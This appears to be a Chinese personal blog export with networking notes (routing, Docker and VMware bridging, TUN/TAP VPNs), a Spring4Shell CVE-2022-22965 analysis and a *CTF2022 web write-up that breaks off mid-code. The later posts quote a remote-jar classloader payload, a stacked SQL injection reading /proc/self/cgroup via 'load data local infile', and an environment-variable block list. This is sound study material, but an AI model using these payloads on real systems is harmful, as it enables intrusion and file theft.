<p>这里学到了一个好用的命令<code>ip route get x.x.x.x</code>，能直接查看ip对应的路由出口网卡，行！<br>然后发现了我一直以来的一个认知误区，我一直以为，比如我在局域网内的ip是192.168.68.10，在192.168.68.0&#x2F;24这么个网段下，那么我访问自己的ip就会从局域网网卡出去，通过局域网路由在给我发回来，只有127.0.0.1这种类型的ip才会走本地的环回口，然而事实却是路由表把每个网卡出口对应的ip都记为本机了，也就是访问192.168.68.10会直接发到loopback上，不会从ethxx发出去再接回来。当然，访问192.168.68.11就会从局域网以太网口上走<br>说起来也是，如果本地路由表查不到192.168.68.10是本机的话，就算是发到局域网里又还回来了，也不能确定这个包是不是自己收啊，所以一开始就之前确定是自己收丢环回口上转去了</p>
<p>补充一下路由规则，当需要发送一个包时，需要先检查自己是否拥有该ip，若拥有则直接走环回口（但即使直接走环回口，源ip不一定是127.0.0.1，而是发起请求时访问的那个本机持有的ip），若不拥有，则查看路由表寻找出口，若路由表中无对应项则发送至默认网关</p>
<h3 id="ICMP响应问题"><a href="#ICMP响应问题" class="headerlink" title="ICMP响应问题"></a>ICMP响应问题</h3><p>scapy发出去的ICMP包似乎有点问题，不知道是我属性赋值没加齐还是怎么，从wireshark上抓包可以看到发出去的每个ICMP请求包都会有一个响应包，但wireshark并不会将该包认定为是scapy发出的ICMP请求包的响应，所以实验中有一个自己发scapy来实现traceroute的功能不太实现的了。感觉不是NAT的问题，因为如果是NAT的问题物理机上也不能用脚本跑通才对。<br>应该是请求和应答之间出了什么问题，使得这个请求和应答不能一一对应，导致物理机并不会把收到的请求发给虚拟机，所以在虚拟机中无法进行试验。而在物理机中不知道为什么，由于ttl为0导致的应答报文似乎能给正确的接受到，但同样的无法匹配正常的响应，所以traceroute会在终点时收不到对应回复</p>
<p>但是杨老师对1.1.1.1发起请求的时候得到了非常正确的结果，我也能复现，对于1.1.1.1这个ip ICMP的响应是能正确的对上的，看来是上层网络还有些奇怪的不可抗力，不知道怎么排障了</p>
<h2 id="桥接、桥接与桥接"><a href="#桥接、桥接与桥接" class="headerlink" title="桥接、桥接与桥接"></a>桥接、桥接与桥接</h2><p>讲述的是docker的桥接和VM的桥接不是一个概念，然后在由于互联网上错综复杂的各种原理解释让我认为他们两是一个概念，再最后绕城一团乱麻故事</p>
<h3 id="VM桥接"><a href="#VM桥接" class="headerlink" title="VM桥接"></a>VM桥接</h3><p>这个是我对桥接最初的理解，是VMware等虚拟化软件中提到的桥接，逻辑网络拓扑如图<br><img src="/images/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88/bridge.png" alt="bridge.png"><br>对于VMware来说这个虚拟交换机就是默认的一个叫VMnet0的虚拟网络，不过我桥接的时候并没有找到对应的网卡，如果能监听该网卡的流量就可以实现对虚拟机对外流量的全部监听<br>对于桥接的工作原理，网上有很多说法，我比较认同的是通过给物理网卡加驱动，能同时分配多个ip地址，然后将网卡运行在混杂模式下，对多个Mac地址进行匹配进行处理，就做到了一个虚拟交换机的效果，就有一种把虚拟机给直接暴露出来，平行于物理机的感觉<br>桥接出来的机器可以通过像物理路由器寻求DHCP来分配一个和物理机同一网段的IP，这样子就能被该局域网的其他主机直接探测到，比如图中的_其他人的物理机_，表现出来的形式就是该局域网中增加了一台机器</p>
<p>但是事情绝不会这么简单，桥接网上的桥接解释还有第二种形式，长这个样<br><img src="/images/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88/vm-bridge.png" alt="vm-bridge.png"><br>这和接下来即将提到的docker桥接的模式图很像，且这里的虚拟网桥还多出来了很多的网卡设备，这也只有在docker的桥接中能看到类似的设备，一度令我十分困惑</p>
<p>现在我觉得合理的解释是图中的网桥，即br0,vnet0,vnet1等网卡设备，都在VMware中被抽象成了一个VMnet0的虚拟交换机，但这些设备通过巧妙的实现并不能在主机中通过ipconfig等命令查看到，对用户隐藏了起来，但这其实是上文中虚拟交换机的实际实现形式</p>
<h3 id="docker桥接"><a href="#docker桥接" class="headerlink" title="docker桥接"></a>docker桥接</h3><p>docker服务在启动之后会创建三个网络服务，VMware也会创建三个，他们的名字很像，可惜完全不是一一对应的关系<br>docker会创建bridge，host和none三种模式，对于bridge模式，Docker在安装时会创建一个名为docker0的虚拟网桥，每次启动一个docker会在物理机上装一个对应的vethxxx，docker的eth0就去连接物理机的vethxxx，这个操作被称为_veth pair_，由于每个docker都是一套全新的命名空间，因此需要使用该方案进行跨命名空间的通信，然后再通过vethxxx连接docker0，并通过该网桥访问外部网络，若多个docker接入同一个网桥（如docker0），则其可以在该网桥的局域网内互联，也可以手动配其他的网桥，这样子的网桥会以br-xxxx命名，可以用<code>brctl show</code>命令查看当前网桥和哪些网卡相连<br>这个图我就不画了，抄一个，一目了然<br><img src="/images/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88/docker_bridge.png" alt="docker_bridge.png"><br>某个文档的内容</p>
<blockquote>
<p>Docker网络bridge桥接模式，是创建和运行容器时默认模式。这种模式会为每个容器分配一个独立的网卡，桥接到默认或指定的bridge上，同一个Bridge下的容器下可以互相通信。</p>
</blockquote>
<p>个人的不成熟意见<br><strong>docker的桥接主要目的是解决跨命名空间的网络通信问题，因此使用了bridge的概念，虽然整体模式看上去与VM的桥接类似，但很关键的一点在于docker的桥接，并没有将宿主机接入到虚拟交换机中，因此仅实现了不同docker之间的互通性，而对外的网络访问使用的仍是NAT，宿主机的表现更像是一个上级路由器，而VM的桥接中物理机的表现更倾向于一个交换机</strong></p>
<h4 id="试一下docker-bridge效果"><a href="#试一下docker-bridge效果" class="headerlink" title="试一下docker bridge效果"></a>试一下docker bridge效果</h4><p>开了三个docker，都是以默认形式开的</p>
<pre><code>bridge name     bridge id               STP enabled     interfaces
docker0         8000.0242f067143f       no              veth382d563
                                                        veth9ae432c
                                                        vethc95bd77
</code></pre>
<p>然后就发现docker0这个网桥上接了三个veth网卡，进容器一看，都是在docker0的172.18.0.1&#x2F;24这个网段，还能互相ping通。这让我突然想起来比赛平台动态起docker的时候如果不把网桥直接进行隔离，岂不是不同用户的容器直接可能互相发现？</p>
<p>还有一点可以验证docker上网的形式是NAT，如果你在docker内去ping一个外部网络，然后在宿主机的出口监听网卡，就能发现外送的ICMP报文实际上使用的是宿主机的IP地址，而不是网桥内的局域网地址，也没有给bridge的docker分配一个新的dhcp地址</p>
<h3 id="其他网络模式"><a href="#其他网络模式" class="headerlink" title="其他网络模式"></a>其他网络模式</h3><h4 id="VMware-NAT"><a href="#VMware-NAT" class="headerlink" title="VMware NAT"></a>VMware NAT</h4><p>老生常谈，和正常的NAT没什么区别，物理机充当上层路由器，所有虚拟机藏在物理机后，对外不可见，且藏在物理机后的虚拟机可互联，画一个图<br><img src="/images/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88/NAT.png" alt="NAT.png"><br>很好理解嗷，其实Docker的桥接在对外访问时，使用的即是NAT模型，但是名字却是桥接，即是这个坑了我好久。NAT在VMware中默认使用的是虚拟网络VMnet8，也是VMware安装时的三大虚拟网络之一</p>
<h4 id="VMware-host-only"><a href="#VMware-host-only" class="headerlink" title="VMware host only"></a>VMware host only</h4><p>VMware三大虚拟网络最后一个，默认为VMnet1，就是搭了个包括主机在内的局域网，不连外网，也可以把主机剔除掉，就简单的搭一个虚拟机局域网</p>
<h4 id="docker-host"><a href="#docker-host" class="headerlink" title="docker host"></a>docker host</h4><p>docker的三大初始网络服务之一<br>某文档里有这么一句</p>
<blockquote>
<p>host模式类似于Vmware的桥接模式，与宿主机在同一个网络中，但没有独立IP地址。</p>
</blockquote>
<p>这我就要说道说道了，你的Bridge相当于VMware的NAT，host再反过来相当于VMware的Bridge，这不给人整懵逼才有鬼呢<br>并且这里虽然说类似于VMware的桥接，但实际上和桥接差距还是很大，确实是和宿主机位于同一网络中了，但是并没有像桥接一样获得一份新的ip地址，而是表现的就像是宿主机上的应该服务，直接使用宿主机的ip和端口。创建该docker的时候，并没有创建新的网络命名空间，因此直接和宿主机位于同一网络命名空间下。比方说开一个mysql的docker，那他的表现就和主机上直接开一个mysql服务的表现差不多，不过这个mysql还被docker再包装了一层，被日了不会导致整个机子被日穿。</p>
<h4 id="docker-none"><a href="#docker-none" class="headerlink" title="docker none"></a>docker none</h4><p>docker三大初始网络服务的最后一个，直接啥网不配，也不向外连接，适合自己搭着在本地玩。也可以自己起了之后再自己进去配网络</p>
<h4 id="docker-container"><a href="#docker-container" class="headerlink" title="docker container"></a>docker container</h4><p>docker一共有四种网络模式，但是安装docker的时候之后安装上述三种默认服务。container模式就更加玄幻了，把已有容器的网络命名空间与新建容器共享，就像是把原有容器作为宿主机，新容器以host形式启动一样，所以这个网络服务不会在docker安装的时候安装在宿主机上，很合理。</p>
<h2 id="TUN-x2F-TAP虚拟网卡"><a href="#TUN-x2F-TAP虚拟网卡" class="headerlink" title="TUN&#x2F;TAP虚拟网卡"></a>TUN&#x2F;TAP虚拟网卡</h2><p>以前研究clash流量接管的时候就已经接触到了这两个玩意了，但一直没搞清楚是什么东西，这次做实验的时候有一步vpn的实现原理，顺便学习了一下</p>
<p>TUN和TAP的区别仅在于一个工作在三层一个工作在二层，TAP相较TUN能够多出一层链路层，就有获取ARP协议之类的能力。和传统的网卡不同，传统网卡连接的是内核协议栈和物理网络接口（网线），而虚拟网卡连接的是内核协议栈与用户程序<br>以tun为例，当用户程序创建tun虚拟网卡时，同时会打开<code>/dev/net/tun</code>这个文件接口，而主机上则会多出一块tunX的网卡，为了便于理解，可以认为这时用户程序是另一台主机，这样子虚拟网卡的表现也就类似于物理网卡，连接内核协议栈与外部网络，这时<code>/dev/net/tun</code>这个文件表现的就像是用户程序模拟出的主机上的一张网卡，当我们向其中写入时，就是向主机的tunX网卡发送数据包，而主机从tunX网卡发出数据包时，就可以在用户程序打开的<code>/dev/net/tun</code>文件中读到</p>
<blockquote>
<p>可以把tun&#x2F;tap看成数据管道，它一端连接主机协议栈，另一端连接用户程序</p>
</blockquote>
<p>TAP因为多了一层arp，表现的更为像一台独立的主机，qemu的桥接模式据说就是使用的TAP网卡将虚拟机模拟成一台网络上完全独立于物理机的机器</p>
<h3 id="vpn的简单原理"><a href="#vpn的简单原理" class="headerlink" title="vpn的简单原理"></a>vpn的简单原理</h3><p>vpn分为client和server两端，client和server均在主机上建立一块tun卡，并处于同一网段。<br>client新建一条路由表，将需要访问的内网ip段指向虚拟网卡，在client主机访问内网ip时，即可将流量导到tun卡上。<br>tun卡按照之前的说法，会将流量发送vpn client程序上，vpn client再把数据加密打包到tunnel中，通过socket连接发送到vpn server的监听端口上。<br>vpn server收到数据后解包解密，写<code>/dev/net/tun</code>，表现的像主机在tun网卡上收到了来自client的请求，然后在内核协议栈中决定路由，从对应接口发送到内网中。<br>内网响应报文回送给vpn server，由于目的地址是client的tun卡ip，因此根据路由表会发送到server的tun卡上，server主机同理会在server程序中获取到返回包，通过socket返回给client。<br>client主机在client程序中收到返回包时，再进行写<code>/dev/net/tun</code>文件的操作，最终client主机在tun网卡上收到返回包</p>
<h3 id="clash-tun"><a href="#clash-tun" class="headerlink" title="clash tun"></a>clash tun</h3><p>写到这又想起之前研究switch联机时的clash tun流量接管方案了，也就是把路由表改掉把所有流量导到tun网卡上，然后clash就能获取到全部流量进行转发吧</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://yuerblog.cc/2017/01/22/understand-bridge-and-dhcp/">理解桥接bridge和dhcp的原理</a> 讲的蛮清楚但总觉得有几个点是错的？<br><a href="https://www.freeaihub.com/article/bridge-module-in-docker-network.html">Docker网络:bridge桥接模式</a> 有点坑的文档<br><a href="https://blog.csdn.net/suchahaerkang/article/details/84570488">Docker的四种网络模式Bridge模式</a><br><a href="http://blog.daocloud.io/docker-bridge/">探索 Docker bridge 的正确姿势，亲测有效！</a><br><a href="https://opengers.github.io/openstack/openstack-base-virtual-network-devices-tuntap-veth/">云计算底层技术-虚拟网络设备(tun&#x2F;tap,veth)</a> 图画的很详细易于理解，好文章</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>NAT</tag>
        <tag>桥接</tag>
        <tag>TUN</tag>
      </tags>
  </entry>
  <entry>
    <title>[CVE-2022-22965]SpringRCE分析</title>
    <url>/%5BCVE-2022-22965%5DSpringRCE%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="CVE-2022-22965-SpringRCE分析"><a href="#CVE-2022-22965-SpringRCE分析" class="headerlink" title="[CVE-2022-22965]SpringRCE分析"></a>[CVE-2022-22965]SpringRCE分析</h1><p>毕设突然通知中期，加上最近又有面试，大概有两个星期没有水文章了。复习面试的时候怕问java，就抽空调了一下最新的spring究极rce。然后现在水成文章</p>
<p>这个洞在刚出来的时候吹的很牛逼，什么核弹级，和log4j那个一样牛逼。那个时候就提到了只能对tomcat部署的spring进行利用，还要jdk9以上。听起来就不是很牛逼，现在再try了一下之后感觉更不nb了，真是不知道在吹什么</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>漏洞原理网上的文章有一大堆，基础原理看的话还有java bean一类的基础知识。</p>
<p>但其实简单的说就是spring框架的路由处参数可以不是字符串，而是一个java bean对象。java bean可以简单的理解为一个对应属性存在getter，setter的类，然后请求的参数如果是这个bean的属性的话，就把这个属性给赋值上去</p>
<p>（一开始调试了半天这个功能，发现调了半天也没发现什么有意思的东西，反正就是发现这个东西能支持递归赋值，比如aa.bb.cc.dd&#x3D;ee，如果对于目标类存在这么多层套娃的话就能把这个几层下面的对象的值赋值成ee，最后的结论是知道这个功能就行，调试没什么用。。。）</p>
<p>写一个测试代码，就先用spring boot测试，这个功能被称为<code>参数绑定</code>，spring核心包中自带。所以是个spring就支持这个功能</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>springdemo<span class="token punctuation">;</span>

<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Controller<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>RequestMapping<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>ResponseBody<span class="token punctuation">;</span>

<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span>
<span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayInputStream<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@ResponseBody</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> String <span class="token function">test</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token annotation punctuation">@ResponseBody</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> String <span class="token function">demo</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"Hello world"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>如果访问<code>/test?name=aaa</code>的话user的name就会被参数绑定功能设置为aaa</p>
<p>而如何获取到java bean的所有getter和setter呢？这里使用了java自带的一个玄幻操作<code>java.beans.PropertyDescriptor</code>，能够自动的获取到对应的这些方法。而所有的对象都继承自object，object存在一个class属性，也能够被PropertyDescriptor给找到。也就是说可以访问到一个class实例。</p>
<p>然后再从class实例往下摸。能够摸到classloader，而接下来的rce就是通过classloader向下寻找，找到存在setter且值为字符串时的攻击手法</p>
<p>这个参数绑定的洞其实不是第一次出现，在十多年前就有一个类似的rce。可以看看这个分析文章<br><a href="http://rui0.cn/archives/1158">SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析</a><br>当时的payload是直接通过修改classloader的url加载远程jar包实现的rce<br><code>class.classLoader.URLs[0]=jar:http://127.0.0.1:8000/sp-exp.jar!/</code><br>然后等待渲染时触发。需要之前没有渲染过对应页面（有点鸡肋）</p>
<p>而现在该方法已经失效，即使在jdk9的全新操作下绕过了spring的防御，但tomcat也做了相应的防范。tomcat在6.0.28后将获取url的方式由引用换成了浅拷贝，保证了即使classloader的url遭到修改，tomcat处的不会同步变化</p>
<p>spring做了个简单的关键字过滤来防，这也是jdk9能够绕过的原因</p>
<p>判断条件为</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token string">"classloader"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pd<span class="token punctuation">.</span>getName<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>即不能访问class类的classloader属性</p>
<p>而这次jdk9的绕过就是因为jdk9出了一个叫做module的操作。简单的看了一下，类似于nodejs的module，可以选择export哪些类，没有被export的类即使是public的也不能被访问（好像可以反射强行访问）。然后要export操作的话需要进行对应的配置文件的修改</p>
<p>而在module这种导入导出的情况下，也利用到了classloader，且module同样在class下<br>因此，使用class.module.classloader即可完成对spring的绕过，但十年前的那个load jar的操作也已经被tomcat修了，因此还需要另找突破口</p>
<p>这里要考虑的是为什么利用条件还加了一个tomcat部署。因为spring本身自带参数绑定，那么就一定是需要tomcat来提供一个rce的点</p>
<p>现在公开的poc为通过tomcat日志的方法写入jsp来getshell。具体网上找poc，懒得细讲。然后简单的测了一下为什么写日志一定要tomcat。。。结论就是只有在tomcat环境下，class.module.classloader才能访问到对应的<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，然后调用getResource才能拿到对应的环境上下文。配置日志路径内容和后缀，完成写入</p>
<p>说起来对jsp的解析本身也是需要额外支持的，所以spring boot就算能被写日志也不会自带jsp的解析，所以攻击条件的tomcat是绝对必须的</p>
<p>日志本身%具有特殊含义，但可以直接利用这个特殊含义在header等位置放置payload，还能绕过waf，无敌</p>
<p>修复方案也很简单，spring直接当bean是class时，只允许修改name属性。<br>tomcat也和十年前一样更新了一波，他们直接说getResource这个方法本身就被废弃了，我直接把他改成return null。。。绝对防御</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>[*CTF2022]web wp</title>
    <url>/%E6%98%9FCTF2022%20web%20wp.html</url>
    <content><![CDATA[<h1 id="CTF2022-web-wp"><a href="#CTF2022-web-wp" class="headerlink" title="[*CTF2022]web wp"></a>[*CTF2022]web wp</h1><p>本来都不准备写了的，然后突然又学到了些什么，然后就又开始写了。。。<br>以及windows不能以*作为文件名。。。。</p>
<h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p>百度一下，你就知道.jpg<br>简单题，主页给了版本号，直接百度这个玩意的历史洞，有一个插件目录下任意文件读取的洞<code>CVE-2021-43798</code>，读<code>etc/grafana/grafana.ini</code>获取到用户名密码，直接登入后台乱点查数据库获取到flag</p>
<h2 id="oh-my-lotto-amp-revenge"><a href="#oh-my-lotto-amp-revenge" class="headerlink" title="oh-my-lotto &amp; revenge"></a>oh-my-lotto &amp; revenge</h2><p>允许上传一个文件，然后每次用<code>os.system(&#39;wget --content-disposition -N lotto&#39;)</code>下载一个文件，该文件是不可预测的随机数序列，在普通版本中上传的文件与该文件相同即可获得flag<br>并且可以查看上次的随机数序列</p>
<p>在os.system之前可以设置一个环境变量，并且有一个简单check</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">safe_check</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'LD'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'HTTP'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'BASH'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'ENV'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'PROXY'</span> <span class="token keyword">in</span> s <span class="token operator">or</span> <span class="token string">'PS'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
</code></pre>
<p>过滤掉了经典PS ENV等p神文章操作，不能rce，也过滤了PROXY防止经典wget文件外带（也许也能劫持下载文件？）<br>直接修改PATH让系统找不到wget即可，先看一下上一次的随机数序列，传一个相同的文件上去，然后再让目标去下载新的序列，但此时修改PATH随便到什么地方，找不到wget命令无法下载，得到的结果仍为上次结果，即可比对通过</p>
<p>revenge版本比对一致也不给flag，需要RCE。赛时没做出来</p>
<h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>本来是不想写这个wp的，但是这个题的赛后讨论让我发现了新的东西，因此存在记录必要</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>功能就是一个裸的SQL注入，存在一个flask debug页面，需要通过计算pin在debug界面实现rce</p>
<p>裸SQL注入直接用sqlmap梭，梭完发现数据库里没东西，os shell udf之类的没有文件权限打不通呜呜。secure_file_priv没设置</p>
<p>然后上车了。看到有人成功把源码导入了数据库，而我刚好在dump数据库。看到了源码，源码开了个infile&#x3D;1。简单搜索之后发现是经典<code>load data local infile</code>，也就是rouge MySQL读取客户端文件的操作，还支持堆叠，使用如下语句打通<br><code>-1&#39;;load data local infile &#39;/proc/self/cgroup&#39; into table ctf.notes (username);-- </code></p>
<p>目标环境站库分离，mysql机器上不允许文件读取，但web app作为client在连接上去的时候允许了infile，因此可以将本地数据导入数据库。配合SQL注入读出，做到了类似于rouge mysql的任意文件读取。好像是一个新的SQL注入站库分离读文件的思路，但实际上需要连接时允许加载文件。还是有点局限，不过确实需要注意在站库分离的情况下，mysql读文件读的是数据库服务端的文件</p>
<p>在任意文件读后即可读取文件计算pin码，这里有几个小坑，其中一个坑了我很久。。。一个是pin的计算方法修改为哪两个文件拼一下，而不是原来的三个文件读到哪个是哪个。这个可以通过搜索快速得知，而第二个则是原先的哈希算法由md5变为了sha1，这个得去GitHub翻源码或者提交记录，一开始坑了我好久<br><a href="https://github.com/pallets/werkzeug/commit/11ba286a1b907110a2d36f5c05740f239bc7deed">use SHA-1 instead of MD5</a></p>
<p>但实际上在计算出了pin以后也坑的要是，在debug页面执行命令会反复爆出当前的错误，而在console路由下执行会反复显示404 not found。。。整的我很无语，最后是有一个队友说他那边能成功执行，所以就出了。。。</p>
<p>这里有一个其他的trick。就是比如这种secure_file_priv这种系统变量怎么注入查，之前看到的操作都是要堆叠能回显的情况下用show语句查，这次看到了用@@进行查询的</p>
<blockquote>
<p>@表示用户变量，@@表示系统变量</p>
</blockquote>
<p>因此，<code>select @@secure_file_priv</code>即可查询到文件可写入路径</p>
<p>整体题解需要探讨的点其实不多，主要探讨问题为notepro该题中出现的debug界面无法正常执行命令<br>这个问题有点超出我的认知范围（出题人自己也没搞清楚，得益于WJH@L3H师傅的究极解答和指导）</p>
<p>先直接给出究极结论，当tl;dr用</p>
<blockquote>
<p>werkzeug debug功能要求关闭并发，因为触发错误时候错误的栈帧frame会保存下来，调试指令会带着frame id。如果调试指令和触发错误的请求不是一个worker处理的话会导致找不到frame而失败<br>一个解决方法是keep alive不关闭连接，就会用同一个worker处理。python用requests.session会自动保持连接。<br>调试指令（?__debugger__&#x3D;yes）在失败的时候会回到正常请求处理流程，所以错误页面会继续弹错误页面<br>而&#x2F;console这个带了__debugger__时候进不去，就404了<br>具体代码在werkzeug&#x2F;debug&#x2F;__init__.py<br>DebuggedApplication.__call__</p>
</blockquote>
<p><a href="https://werkzeug.palletsprojects.com/en/2.1.x/debug/">https://werkzeug.palletsprojects.com/en/2.1.x/debug/</a><br>该链接也说明了其debugger在多进程环境下无法工作</p>
<p>开调</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="debug页面无法执行"><a href="#debug页面无法执行" class="headerlink" title="debug页面无法执行"></a>debug页面无法执行</h4><p>找触发点，这里已经告知了在<code>werkzeug/debug/__init__.py</code>下，主要就是看<code>__call__</code>方法，该方法负责处理所有请求</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>
        self<span class="token punctuation">,</span> environ<span class="token punctuation">:</span> <span class="token string">"WSGIEnvironment"</span><span class="token punctuation">,</span> start_response<span class="token punctuation">:</span> <span class="token string">"StartResponse"</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Iterable<span class="token punctuation">[</span>bytes<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Dispatch the requests."""</span>
        <span class="token comment" spellcheck="true"># important: don't ever access a function here that reads the incoming</span>
        <span class="token comment" spellcheck="true"># form data!  Otherwise the application won't have access to that data</span>
        <span class="token comment" spellcheck="true"># any more!</span>
        request <span class="token operator">=</span> Request<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>debug_application
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"__debugger__"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>
            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
            arg <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"f"</span><span class="token punctuation">)</span>
            secret <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">)</span>
            frame <span class="token operator">=</span> self<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frm"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
            <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">"resource"</span> <span class="token operator">and</span> arg<span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>get_resource<span class="token punctuation">(</span>request<span class="token punctuation">,</span> arg<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"pinauth"</span> <span class="token operator">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
                response <span class="token operator">=</span> self<span class="token punctuation">.</span>pin_auth<span class="token punctuation">(</span>request<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># type: ignore</span>
            <span class="token keyword">elif</span> cmd <span class="token operator">==</span> <span class="token string">"printpin"</span> <span class="token operator">and</span> secret <span class="token operator">==</span> self<span class="token punctuation">.</span>secret<span class="token punctuation">:</span>
